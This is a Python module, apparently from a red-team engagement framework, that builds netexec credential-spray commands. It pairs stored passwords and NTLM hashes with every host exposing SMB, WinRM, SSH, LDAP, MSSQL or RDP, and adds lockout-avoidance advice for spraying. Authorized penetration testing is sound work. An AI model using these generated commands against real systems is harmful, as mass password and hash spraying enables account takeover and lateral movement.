"""Credential spray planning — the credential_reuse primitive, made actionable.

Credentials are never exhausted: once the vault is non-empty, every credential is
a candidate against every reachable auth surface. build_spray_plan pairs each
vault credential with each host exposing a sprayable protocol and renders the
netexec commands. Spraying is active auth-testing, so it is proposal-tier — the
operator runs it.
"""
from __future__ import annotations

import shlex
import sqlite3
from collections import defaultdict

from yhwach.db import list_credentials

# surface kind -> netexec protocol
SPRAYABLE = {"smb", "winrm", "ssh", "ldap", "mssql", "rdp"}


def build_spray_plan(
    conn: sqlite3.Connection,
    engagement_id: int,
    *,
    proto_filter: str | None = None,
) -> list[str]:
    """Return netexec spray commands: each (protocol, credential) across all
    hosts exposing that protocol. Empty if the vault or the surfaces are empty."""
    creds = list_credentials(conn, engagement_id)
    if not creds:
        return []

    rows = conn.execute(
        "SELECT DISTINCT h.ip AS ip, s.kind AS kind "
        "FROM host h JOIN surface s ON s.host_id = h.id "
        "WHERE h.engagement_id = ? AND s.kind IN "
        "('smb','winrm','ssh','ldap','mssql','rdp') "
        "ORDER BY s.kind, h.ip",
        (engagement_id,),
    ).fetchall()

    proto_ips: dict[str, list[str]] = defaultdict(list)
    for r in rows:
        proto_ips[r["kind"]].append(r["ip"])

    commands: list[str] = []
    for proto in sorted(proto_ips):
        if proto_filter and proto != proto_filter:
            continue
        ip_list = " ".join(sorted(set(proto_ips[proto])))
        for c in creds:
            secret = c["secret"] or ""
            # Shell-quote every field: secrets and identifiers can legitimately
            # contain quotes, spaces, or shell metacharacters, which would
            # otherwise break or misfire the rendered nxc line.
            flag = "-H" if c["kind"] == "ntlm" else "-p"
            auth = f"{flag} {shlex.quote(secret)}"
            user = shlex.quote(c["identifier"] or "")
            commands.append(
                f"nxc {proto} {ip_list} -u {user} {auth} --continue-on-success"
            )
    return commands


def lockout_note(conn: sqlite3.Connection, engagement_id: int) -> str | None:
    """OPSEC gate for spraying: read the known password policy and warn when a
    lockout threshold makes blind spraying dangerous.

    Returns None when there is a confirmed no-lockout policy (safe to spray) or a
    warning string otherwise — unknown policy is treated as risky, since spraying
    into an unknown lockout can lock out the domain."""
    rows = conn.execute(
        "SELECT domain, lockout_threshold FROM password_policy "
        "WHERE engagement_id = ? ORDER BY id DESC",
        (engagement_id,),
    ).fetchall()
    if not rows:
        return ("[OPSEC] No password policy recorded — spraying blind risks lockout. "
                "Enumerate it first (`nxc smb <dc> -u <user> -p <pass> --pass-pol`) "
                "and ingest with --kind netexec.")
    # Use the most recently learned policy with a non-null threshold.
    for r in rows:
        thr = r["lockout_threshold"]
        if thr is None:
            continue
        if thr == 0:
            return None  # no lockout — safe
        return (f"[OPSEC] Lockout threshold = {thr} (domain {r['domain'] or '?'}). "
                f"Keep attempts per account below {thr} and account for the reset window; "
                "prefer one carefully chosen password across many users over many "
                "passwords against one user.")
    return ("[OPSEC] Password policy recorded but lockout threshold unknown — "
            "treat spraying as risky until confirmed.")
